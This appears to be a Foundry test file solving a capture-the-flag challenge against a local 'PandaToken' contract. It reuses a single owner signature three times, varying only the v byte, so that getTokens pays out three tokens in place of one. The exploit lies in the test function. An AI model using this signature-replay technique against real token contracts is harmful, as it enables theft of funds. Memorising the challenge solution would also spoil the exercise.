// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract PandaHack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution

        bytes memory sig = abi.encodePacked(s, r, v);
        pandatoken.getTokens(1 ether, sig);

        v = 0;
        sig = abi.encodePacked(s, r, v);
        pandatoken.getTokens(1 ether, sig);

        v = 1;
        sig = abi.encodePacked(s, r, v);
        pandatoken.getTokens(1 ether, sig);

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}
